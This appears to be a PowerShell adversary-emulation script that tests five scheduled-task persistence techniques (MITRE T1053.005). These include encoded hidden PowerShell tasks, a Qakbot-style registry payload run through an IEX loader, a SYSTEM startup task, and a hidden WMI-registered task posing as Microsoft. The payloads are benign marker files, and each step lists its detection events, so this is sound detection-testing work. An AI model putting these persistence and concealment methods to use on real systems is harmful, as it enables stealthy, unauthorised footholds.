<#
.SYNOPSIS
    Technique 4.2: Scheduled Task/Job Persistence (T1053.005)

.DESCRIPTION
    Five sub-tests covering scheduled task persistence techniques.

    Sub-test 1 (SchtasksOnLogon) - schtasks.exe /create /sc ONLOGON writes a user-level
                                    task carrying a Base64-encoded PowerShell payload. Classic,
                                    noisy; produces strong telemetry via schtasks.exe CLI args.

    Sub-test 2 (PwshCmdlet)      - Native PS cmdlets (New-ScheduledTaskAction,
                                    Register-ScheduledTask) register an at-logon task.
                                    Avoids schtasks.exe entirely; uses WMI (PS_ScheduledTask)
                                    under the hood, producing different telemetry.

    Sub-test 3 (B64Registry)     - Mirrors Qakbot: a Base64-encoded payload is stored in a
                                    registry key; a scheduled task runs a loader script that
                                    decodes and executes it at runtime via IEX + Get-ItemProperty.

    Sub-test 4 (SystemTask)      - schtasks.exe /create /sc ONSTART /ru SYSTEM creates a
                                    startup task running as NT AUTHORITY\SYSTEM. Effective
                                    privilege escalation. Requires local admin.

    Sub-test 5 (HiddenXML)       - Registers a task via Invoke-CimMethod (WMI class
                                    PS_ScheduledTask.RegisterByXml) from inline XML with
                                    Hidden=true - mirrors TrickBot/Industroyer2 persistence;
                                    task is invisible to schtasks /query and Task Scheduler GUI.
                                    Requires local admin.

    All sub-tests write a marker file to C:\Windows\Temp\ as proof-of-execution.
    Nothing malicious runs - benign file writes only.

.PARAMETER Subtest
    Which sub-test to run. Use 'All' to run all five sequentially.
    Default: SchtasksOnLogon.

.EXAMPLE
    .\v4.2-scheduled-task.ps1 -Subtest SchtasksOnLogon
    .\v4.2-scheduled-task.ps1 -Subtest All
#>

param(
    [ValidateSet('SchtasksOnLogon','PwshCmdlet','B64Registry','SystemTask','HiddenXML','All')]
    [Alias('Technique')]
    [string]$Subtest = 'SchtasksOnLogon',
    [switch]$NoCleanupPrompt,
    [switch]$NoReport,
    [switch]$NoPause,
    [switch]$CleanupOnly
)

$tempDir = "C:\Windows\Temp"

$taskNames = @{
    SchtasksOnLogon = "SCT-OnLogon"
    PwshCmdlet      = "SCT-PwshCmdlet"
    B64Registry     = "SCT-B64Registry"
    SystemTask      = "SCT-SystemTask"
    HiddenXML       = "SCT-HiddenXML"
}

$b64RegPath = "HKCU:\SOFTWARE\SCT-B64Test"
$b64RegName = "payload"

# ==============================================================================
# HELPERS
# ==============================================================================

function Write-Header {
    param([string]$Title, [string]$Detection)
    Write-Host ("`n" + ("="*90)) -ForegroundColor Magenta
    Write-Host "  SUBTEST: $Title" -ForegroundColor Magenta
    Write-Host "  DETECTION DIFFICULTY: $Detection" -ForegroundColor Magenta
    Write-Host ("="*90) -ForegroundColor Magenta
}

function Test-ExecutionResult {
    param([string]$Name)
    Start-Sleep -Seconds 3
    $marker = "$tempDir\art-v4.2-$Name.txt"
    if (Test-Path $marker) {
        Write-Host "[+] SUCCESS: Payload executed - $marker" -ForegroundColor Green
        return $true
    } else {
        Write-Host "[-] FAILED: Payload did not execute (or was blocked)" -ForegroundColor Red
        return $false
    }
}

function Invoke-Cleanup {
    param([string[]]$Names)
    foreach ($n in $Names) {
        Remove-Item "$tempDir\art-v4.2-$n.txt" -Force -ErrorAction Ignore
    }
    foreach ($tn in $taskNames.Values) {
        Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction Ignore
        schtasks /delete /tn $tn /f 2>$null | Out-Null
    }
    Remove-Item -Path $b64RegPath -Recurse -Force -ErrorAction Ignore
    Remove-Item "$tempDir\sct-b64-loader.ps1" -Force -ErrorAction Ignore
    Write-Host "[+] Cleanup complete" -ForegroundColor Green
}

# ==============================================================================
# SUB-TEST 1: schtasks.exe ONLOGON task
# Atomic Red Team: T1053.005 Test #1
# ==============================================================================

function Test-SchtasksOnLogon {
    Write-Header "schtasks.exe ONLOGON Scheduled Task (Atomic Test #1)" "HIGH"
    Write-Host "`nTask   : $($taskNames.SchtasksOnLogon)"
    Write-Host "Method : schtasks.exe /create /sc ONLOGON registers a user-level task carrying a"
    Write-Host "         Base64-encoded PowerShell payload. Fires at every user login."
    Write-Host "         No elevation required for user-scoped tasks."
    Write-Host "`nDetection:"
    Write-Host "  Event 4698 - A scheduled task was created (Microsoft-Windows-TaskScheduler/Operational)"
    Write-Host "  Sysmon 1   - schtasks.exe process created with /create and /sc ONLOGON in args"
    Write-Host "  EDR alert  - schtasks.exe /TR arg containing Base64 / -EncodedCommand"
    Write-Host "  SIEM rule  - Task creation event followed by immediate task run within short window"

    $marker  = "$tempDir\art-v4.2-SchtasksOnLogon.txt"
    $command = "New-Item '$marker' -Force -EA 0"
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
    $tn      = $taskNames.SchtasksOnLogon
    $taskCmd = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $encoded"

    Write-Host "`n[*] Creating ONLOGON task via schtasks.exe..." -ForegroundColor Yellow
    Write-Host "    Task name : $tn" -ForegroundColor DarkGray
    Write-Host "    Schedule  : ONLOGON" -ForegroundColor DarkGray
    Write-Host "    Command   : powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand [base64]" -ForegroundColor DarkGray
    Write-Host "    [Detection: Event 4698 - Scheduled task created; Sysmon 1 - schtasks.exe /create]" -ForegroundColor DarkGray

    $result = schtasks /create /tn $tn /sc ONLOGON /tr $taskCmd /f 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Host "  RESULT: Task creation blocked or failed - $result" -ForegroundColor Green
        return $false
    }
    Write-Host "    Task created successfully." -ForegroundColor Green

    Write-Host "`n[*] Verifying task was registered..." -ForegroundColor Yellow
    schtasks /query /tn $tn /fo LIST 2>&1 | Select-String "Task Name|Status|Schedule Type" | Out-Host

    Write-Host "`n[*] Executing task now (simulates login trigger)..." -ForegroundColor Yellow
    Write-Host "    [Detection: Sysmon 1 - powershell.exe -WindowStyle Hidden -EncodedCommand spawned by TaskScheduler]" -ForegroundColor DarkGray
    $runResult = schtasks /run /tn $tn 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Host "  Execution blocked: $runResult" -ForegroundColor Green
        return $false
    }

    return (Test-ExecutionResult -Name "SchtasksOnLogon")
}

# ==============================================================================
# SUB-TEST 2: PowerShell cmdlet - Register-ScheduledTask
# Atomic Red Team: T1053.005 Test #4
# ==============================================================================

function Test-PwshCmdlet {
    Write-Header "PowerShell Cmdlet Scheduled Task (Atomic Test #4)" "HIGH"
    Write-Host "`nTask   : $($taskNames.PwshCmdlet)"
    Write-Host "Method : New-ScheduledTaskAction / Register-ScheduledTask - native PS cmdlets"
    Write-Host "         that call WMI (PS_ScheduledTask) internally. No schtasks.exe process"
    Write-Host "         is spawned, so CLI-arg-based detections miss this entirely."
    Write-Host "`nDetection:"
    Write-Host "  Event 4698 - A scheduled task was created"
    Write-Host "  Event 4104 - Script Block Logging: New-ScheduledTaskAction / Register-ScheduledTask"
    Write-Host "  Sysmon 20  - WmiEvent: PS_ScheduledTask method invoked without schtasks.exe"
    Write-Host "  EDR alert  - Register-ScheduledTask with RunLevel Highest is uncommon for users"

    $marker  = "$tempDir\art-v4.2-PwshCmdlet.txt"
    $command = "New-Item '$marker' -Force -EA 0"
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
    $tn      = $taskNames.PwshCmdlet

    Write-Host "`n[*] Registering task via New-ScheduledTaskAction / Register-ScheduledTask..." -ForegroundColor Yellow
    Write-Host "    Task name : $tn" -ForegroundColor DarkGray
    Write-Host "    Trigger   : AtLogon" -ForegroundColor DarkGray
    Write-Host "    RunLevel  : Limited (current user - no elevation required)" -ForegroundColor DarkGray
    Write-Host "    Command   : powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand [base64]" -ForegroundColor DarkGray
    Write-Host "    [Detection: Event 4698; Event 4104 - Script Block with Register-ScheduledTask]" -ForegroundColor DarkGray

    try {
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -EncodedCommand $encoded"
        $trigger = New-ScheduledTaskTrigger -AtLogon
        $user    = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Limited
        $set     = New-ScheduledTaskSettingsSet
        $task    = New-ScheduledTask -Action $action -Principal $user -Trigger $trigger -Settings $set
        Register-ScheduledTask -TaskName $tn -InputObject $task -Force -ErrorAction Stop | Out-Null
        Write-Host "    Task registered successfully." -ForegroundColor Green
    } catch {
        Write-Host "  RESULT: Task registration blocked - $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    Write-Host "`n[*] Verifying task was registered..." -ForegroundColor Yellow
    Get-ScheduledTask -TaskName $tn -ErrorAction Ignore |
        Select-Object TaskName, State, @{N='Trigger';E={$_.Triggers[0].GetType().Name}}

    Write-Host "`n[*] Executing task now (simulates login trigger)..." -ForegroundColor Yellow
    Write-Host "    [Detection: Sysmon 1 - powershell.exe -WindowStyle Hidden -EncodedCommand spawned by TaskScheduler]" -ForegroundColor DarkGray
    try {
        Start-ScheduledTask -TaskName $tn -ErrorAction Stop
    } catch {
        Write-Host "  Execution blocked: $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    return (Test-ExecutionResult -Name "PwshCmdlet")
}

# ==============================================================================
# SUB-TEST 3: Base64 registry payload + loader script (Qakbot pattern)
# Atomic Red Team: T1053.005 Test #7
# ==============================================================================

function Test-B64Registry {
    Write-Header "Base64 Registry Payload + Scheduled Task Loader (Atomic Test #7 - Qakbot Pattern)" "HIGH"
    Write-Host "`nTask   : $($taskNames.B64Registry)"
    Write-Host "Method : Mirrors Qakbot MO - two-stage persistence:"
    Write-Host "         Stage 1: Base64-encoded payload stored in a non-standard HKCU registry key."
    Write-Host "         Stage 2: A scheduled task runs a loader script that decodes the registry"
    Write-Host "         value and executes it via IEX at runtime. Separates the payload from the"
    Write-Host "         task definition, complicating static analysis."
    Write-Host "`nDetection:"
    Write-Host "  Sysmon 13  - RegistryEvent (Value Set) on non-standard HKCU\SOFTWARE key"
    Write-Host "  Event 4698 - Scheduled task created; /TR points to a .ps1 loader in Temp"
    Write-Host "  Event 4104 - Script Block Logging: IEX + Base64 + Get-ItemProperty in loader"
    Write-Host "  SIEM rule  - Registry write to HKCU\SOFTWARE\SCT* followed by task creation"
    Write-Host "  Threat Intel - IEX + [System.Convert]::FromBase64String + Get-ItemProperty chain"

    $marker     = "$tempDir\art-v4.2-B64Registry.txt"
    $command    = "New-Item '$marker' -Force -EA 0"
    $encoded    = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($command))
    $loaderPath = "$tempDir\sct-b64-loader.ps1"
    $tn         = $taskNames.B64Registry

    Write-Host "`n[*] Writing Base64 payload to registry: $b64RegPath" -ForegroundColor Yellow
    Write-Host "    Key   : $b64RegPath" -ForegroundColor DarkGray
    Write-Host "    Value : $b64RegName" -ForegroundColor DarkGray
    Write-Host "    Data  : [base64-encoded PowerShell command]" -ForegroundColor DarkGray
    Write-Host "    [Detection: Sysmon 13 - RegistryEvent (Value Set) on non-standard key]" -ForegroundColor DarkGray

    try {
        if (-not (Test-Path $b64RegPath)) {
            New-Item -Path $b64RegPath -Force | Out-Null
        }
        Set-ItemProperty -Path $b64RegPath -Name $b64RegName -Value $encoded -ErrorAction Stop
        Write-Host "    Registry write succeeded." -ForegroundColor Green
    } catch {
        Write-Host "  RESULT: Registry write blocked - $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    $loaderContent = @"
`$payload = (Get-ItemProperty -Path '$b64RegPath').$b64RegName
IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(`$payload)))
"@

    Write-Host "`n[*] Writing loader script: $loaderPath" -ForegroundColor Yellow
    Write-Host "    Content: Get-ItemProperty -> Base64Decode -> IEX" -ForegroundColor DarkGray
    Write-Host "    [Detection: Sysmon 11 - FileCreate .ps1 in Temp; Event 4104 - IEX chain on execution]" -ForegroundColor DarkGray
    try {
        Set-Content -Path $loaderPath -Value $loaderContent -Encoding UTF8 -ErrorAction Stop
        Write-Host "    Loader script written." -ForegroundColor Green
    } catch {
        Write-Host "  RESULT: Loader write blocked - $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    $startTime = (Get-Date).AddMinutes(2).ToString("HH:mm")

    Write-Host "`n[*] Creating scheduled task that executes the loader..." -ForegroundColor Yellow
    Write-Host "    Task name : $tn" -ForegroundColor DarkGray
    Write-Host "    Schedule  : ONCE at $startTime (immediate /run used for test)" -ForegroundColor DarkGray
    Write-Host "    /TR       : powershell.exe -NoProfile -WindowStyle Hidden -File $loaderPath" -ForegroundColor DarkGray
    Write-Host "    [Detection: Event 4698 - task TR points to Temp .ps1 loader script]" -ForegroundColor DarkGray

    $result = schtasks /create /f /tn $tn /sc ONCE /st $startTime /tr "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -File $loaderPath" 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Host "  RESULT: Task creation blocked or failed - $result" -ForegroundColor Green
        return $false
    }
    Write-Host "    Task created successfully." -ForegroundColor Green

    Write-Host "`n[*] Running task immediately to verify loader + IEX chain..." -ForegroundColor Yellow
    Write-Host "    [Detection: Sysmon 1 - powershell.exe -> IEX(Base64(Get-ItemProperty(registry)))]" -ForegroundColor DarkGray
    $runResult = schtasks /run /tn $tn 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Host "  Execution blocked: $runResult" -ForegroundColor Green
        return $false
    }

    return (Test-ExecutionResult -Name "B64Registry")
}

# ==============================================================================
# SUB-TEST 4: SYSTEM-context startup task via schtasks /ru SYSTEM
# Atomic Red Team: T1053.005 Test #1 (SYSTEM variant)
# Requires local admin.
# ==============================================================================

function Test-SystemTask {
    Write-Header "SYSTEM-Context Scheduled Task - schtasks /ru SYSTEM (Atomic Test #1 variant)" "MEDIUM"
    Write-Host "`nTask   : $($taskNames.SystemTask)"
    Write-Host "Method : schtasks.exe /create /sc ONSTART /ru SYSTEM registers a startup task that"
    Write-Host "         executes as NT AUTHORITY\SYSTEM. Effective privilege escalation - arbitrary"
    Write-Host "         code runs at the highest system context on each boot. Requires local admin."
    Write-Host "`nDetection:"
    Write-Host "  Event 4698 - Scheduled task created; check XML Principal for NT AUTHORITY\SYSTEM"
    Write-Host "  Sysmon 1   - schtasks.exe with /ru system and /sc onstart in command-line args"
    Write-Host "  Event 4702 - Scheduled task updated (if modifying an existing task)"
    Write-Host "  EDR alert  - Non-SYSTEM process creating a SYSTEM-principal scheduled task"

    $marker  = "$tempDir\art-v4.2-SystemTask.txt"
    $command = "New-Item '$marker' -Force -EA 0"
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
    $tn      = $taskNames.SystemTask
    $taskCmd = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $encoded"

    Write-Host "`n[*] Creating SYSTEM-context startup task via schtasks.exe /ru SYSTEM..." -ForegroundColor Yellow
    Write-Host "    Task name : $tn" -ForegroundColor DarkGray
    Write-Host "    Schedule  : ONSTART (at system boot)" -ForegroundColor DarkGray
    Write-Host "    Run As    : NT AUTHORITY\SYSTEM" -ForegroundColor DarkGray
    Write-Host "    Command   : powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand [base64]" -ForegroundColor DarkGray
    Write-Host "    [Detection: Event 4698 with Principal = NT AUTHORITY\SYSTEM; Sysmon 1 /ru system]" -ForegroundColor DarkGray

    $result = schtasks /create /tn $tn /sc ONSTART /ru SYSTEM /tr $taskCmd /f 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Host "  RESULT: Task creation blocked or failed (elevation may be required) - $result" -ForegroundColor Green
        return $false
    }
    Write-Host "    Task created successfully." -ForegroundColor Green

    Write-Host "`n[*] Verifying SYSTEM principal in task definition..." -ForegroundColor Yellow
    schtasks /query /tn $tn /fo LIST 2>&1 | Select-String "Task Name|Run As User|Status" | Out-Host

    Write-Host "`n[*] Running task now (executes as NT AUTHORITY\SYSTEM)..." -ForegroundColor Yellow
    Write-Host "    [Detection: Sysmon 1 - powershell.exe spawned by Task Scheduler with SYSTEM token]" -ForegroundColor DarkGray
    $runResult = schtasks /run /tn $tn 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Host "  Execution blocked: $runResult" -ForegroundColor Green
        return $false
    }

    return (Test-ExecutionResult -Name "SystemTask")
}

# ==============================================================================
# SUB-TEST 5: Hidden task via Invoke-CimMethod (WMI PS_ScheduledTask.RegisterByXml)
# Atomic Red Team: T1053.005 Test #8 - TrickBot / Industroyer2 pattern
# Requires local admin.
# ==============================================================================

function Test-HiddenXML {
    Write-Header "Hidden Scheduled Task via WMI XML Import (Atomic Test #8 - TrickBot/Industroyer2 Pattern)" "HIGH"
    Write-Host "`nTask   : $($taskNames.HiddenXML)"
    Write-Host "Method : Invoke-CimMethod (WMI class PS_ScheduledTask.RegisterByXml) registers a"
    Write-Host "         task from inline XML containing [Hidden]true[/Hidden]. The task is NOT"
    Write-Host "         visible in 'schtasks /query' or the Task Scheduler GUI. No schtasks.exe"
    Write-Host "         process is spawned. Author/Description masquerade as Microsoft. Requires admin."
    Write-Host "`nDetection:"
    Write-Host "  Event 4698 - Task created; XML body contains [Hidden]true[/Hidden]"
    Write-Host "  Sysmon 20  - WmiEvent: PS_ScheduledTask.RegisterByXml method invoked"
    Write-Host "  WMI audit  - Root\Microsoft\Windows\TaskScheduler namespace activity"
    Write-Host "  No schtasks.exe - absence of expected process telemetry is itself a signal"
    Write-Host "  Hunt query - Get-ScheduledTask | Where-Object { `$_.Settings.Hidden }"
    Write-Host "  Hunt query - reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache"

    $marker  = "$tempDir\art-v4.2-HiddenXML.txt"
    $command = "New-Item '$marker' -Force -EA 0"
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
    $tn      = $taskNames.HiddenXML

    $xmlContent = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <URI>\$tn</URI>
    <Date>2024-01-01T00:00:00</Date>
    <Author>Microsoft Corporation</Author>
    <Description>Windows Update Maintenance Helper</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NoProfile -WindowStyle Hidden -EncodedCommand $encoded</Arguments>
    </Exec>
  </Actions>
</Task>
"@

    Write-Host "`n[*] Registering hidden task via Invoke-CimMethod (WMI PS_ScheduledTask.RegisterByXml)..." -ForegroundColor Yellow
    Write-Host "    Task name    : $tn" -ForegroundColor DarkGray
    Write-Host "    XML setting  : [Hidden]true[/Hidden]" -ForegroundColor DarkGray
    Write-Host "    XML author   : 'Microsoft Corporation' (masquerade)" -ForegroundColor DarkGray
    Write-Host "    XML desc     : 'Windows Update Maintenance Helper' (masquerade)" -ForegroundColor DarkGray
    Write-Host "    Method       : PS_ScheduledTask.RegisterByXml - no schtasks.exe spawned" -ForegroundColor DarkGray
    Write-Host "    [Detection: Sysmon 20 - WmiEvent; Event 4698; absence of schtasks.exe process]" -ForegroundColor DarkGray

    try {
        $cimResult = Invoke-CimMethod -ClassName PS_ScheduledTask `
            -NameSpace "Root\Microsoft\Windows\TaskScheduler" `
            -MethodName "RegisterByXml" `
            -Arguments @{ Force = $true; Xml = $xmlContent } `
            -ErrorAction Stop
        if ($cimResult.ReturnValue -ne 0) {
            throw "RegisterByXml returned error code: $($cimResult.ReturnValue)"
        }
        Write-Host "    Task registered via WMI (ReturnValue=0)." -ForegroundColor Green
    } catch {
        Write-Host "  RESULT: WMI task registration blocked (elevation may be required) - $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    Write-Host "`n[*] Demonstrating task is invisible to schtasks /query..." -ForegroundColor Yellow
    $schtasksOut = schtasks /query /tn $tn /fo LIST 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Host "    schtasks /query: task NOT found - Hidden=true confirmed." -ForegroundColor Cyan
    } else {
        Write-Host "    schtasks /query returned output (Hidden may not have taken effect): $schtasksOut"
    }

    Write-Host "`n[*] Confirming task exists via Get-ScheduledTask (CIM-based query)..." -ForegroundColor Yellow
    $found = Get-ScheduledTask -TaskName $tn -ErrorAction Ignore
    if ($found) {
        Write-Host "    Get-ScheduledTask found: $($found.TaskName) | Hidden: $($found.Settings.Hidden)" -ForegroundColor Cyan
    } else {
        Write-Host "    Get-ScheduledTask also could not find the task." -ForegroundColor Red
        return $false
    }

    Write-Host "`n[*] Running task now to verify payload execution..." -ForegroundColor Yellow
    Write-Host "    [Detection: Sysmon 1 - powershell.exe -WindowStyle Hidden -EncodedCommand spawned by TaskScheduler]" -ForegroundColor DarkGray
    try {
        Start-ScheduledTask -TaskName $tn -ErrorAction Stop
    } catch {
        Write-Host "  Execution blocked: $($_.Exception.Message)" -ForegroundColor Green
        return $false
    }

    return (Test-ExecutionResult -Name "HiddenXML")
}

# ==============================================================================
# RUN ALL
# ==============================================================================

function Test-All {
    Write-Host "`n+==============================================================================+" -ForegroundColor Cyan
    Write-Host "|   SCHEDULED TASK PERSISTENCE - ALL TECHNIQUES                               |" -ForegroundColor Cyan
    Write-Host "+==============================================================================+" -ForegroundColor Cyan

    $tests = @(
        @{ Name = 'SchtasksOnLogon'; Fn = ${function:Test-SchtasksOnLogon} },
        @{ Name = 'PwshCmdlet';      Fn = ${function:Test-PwshCmdlet}      },
        @{ Name = 'B64Registry';     Fn = ${function:Test-B64Registry}     },
        @{ Name = 'SystemTask';      Fn = ${function:Test-SystemTask}      },
        @{ Name = 'HiddenXML';       Fn = ${function:Test-HiddenXML}       }
    )

    $results = @()
    foreach ($t in $tests) {
        $results += @{ Name = $t.Name; Success = (& $t.Fn) }
        if (-not $NoPause) {
            Write-Host "`n[!] Check EDR/AV console before continuing." -ForegroundColor Yellow
            [void](Read-Host "    Press Enter for next sub-test")
        }
    }
    return $results
}

# ==============================================================================
# REPORT
# ==============================================================================

function Write-Report {
    param([array]$Results)
    Write-Host "`n+==============================================================================+" -ForegroundColor Cyan
    Write-Host "|                         EXECUTION REPORT                                    |" -ForegroundColor Cyan
    Write-Host "+==============================================================================+" -ForegroundColor Cyan
    foreach ($r in $Results) {
        $label = if ($r.Success) { "EXECUTED" } else { "BLOCKED " }
        $color = if ($r.Success) { 'Green' }   else { 'Red' }
        Write-Host "  [$label] $($r.Name)" -ForegroundColor $color
    }
    $ok    = ($Results | Where-Object { $_.Success }).Count
    $total = $Results.Count
    Write-Host "`n  $ok of $total techniques executed successfully" -ForegroundColor Cyan
}

# ==============================================================================
# MAIN
# ==============================================================================

if ($CleanupOnly) {
    Invoke-Cleanup -Names @('SchtasksOnLogon','PwshCmdlet','B64Registry','SystemTask','HiddenXML')
    exit 0
}

Write-Host "`n[TEST] Scheduled Task/Job Persistence (Technique 4.2)" -ForegroundColor Cyan
Write-Host "  MITRE: T1053.005  |  Phase 4  |  Persistence`n"

switch ($Subtest) {
    'All' {
        $results = Test-All
        if (-not $NoReport) {
            Write-Report -Results $results
        }
        Write-Host "`n[*] Marker files in $tempDir (art-v4.2-*.txt) left for review." -ForegroundColor Yellow
        if (-not $NoCleanupPrompt) {
            $c = Read-Host "Clean up now? (Y/N)"
            if ($c -eq 'Y' -or $c -eq 'y') {
                Invoke-Cleanup -Names @('SchtasksOnLogon','PwshCmdlet','B64Registry','SystemTask','HiddenXML')
            }
        }
    }
    default {
        Write-Host "+==============================================================================+" -ForegroundColor Cyan
        Write-Host "|   SINGLE SUBTEST: $Subtest" -ForegroundColor Cyan
        Write-Host "+==============================================================================+" -ForegroundColor Cyan
        Write-Host "`n[!] Have EDR/AV console visible before proceeding." -ForegroundColor Yellow
        Read-Host "    Press Enter to start"

        $success = switch ($Subtest) {
            'SchtasksOnLogon' { Test-SchtasksOnLogon }
            'PwshCmdlet'      { Test-PwshCmdlet      }
            'B64Registry'     { Test-B64Registry     }
            'SystemTask'      { Test-SystemTask      }
            'HiddenXML'       { Test-HiddenXML       }
        }

        $color = if ($success) { 'Green' } else { 'Red' }
        Write-Host "`n[RESULT] Subtest '$Subtest': $(if ($success) { 'EXECUTED' } else { 'BLOCKED' })" -ForegroundColor $color
        if (-not $NoCleanupPrompt) {
            $c = Read-Host "Clean up now? (Y/N)"
            if ($c -eq 'Y' -or $c -eq 'y') { Invoke-Cleanup -Names @($Subtest) }
        }
    }
}
